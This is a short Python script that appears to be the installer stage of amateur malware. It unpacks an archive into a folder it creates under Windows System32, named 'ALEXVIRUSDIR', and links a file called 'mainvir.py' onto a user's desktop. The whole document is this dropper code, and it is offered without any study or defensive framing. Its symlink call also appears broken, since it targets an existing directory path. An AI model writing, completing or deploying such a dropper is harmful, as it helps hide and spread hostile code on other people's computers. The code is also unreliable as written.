import zipfile

with zipfile.ZipFile("files.zip", "r") as zf:
    zf.extractall("C://Windows/System32/ALEXVIRUSDIR")
    import os
    os.symlink("C://Windows/System32/ALEXVIRUSDIR/mainvir.py", "C:/Users/alekv_hcwmzuo/Рабочий стол/")
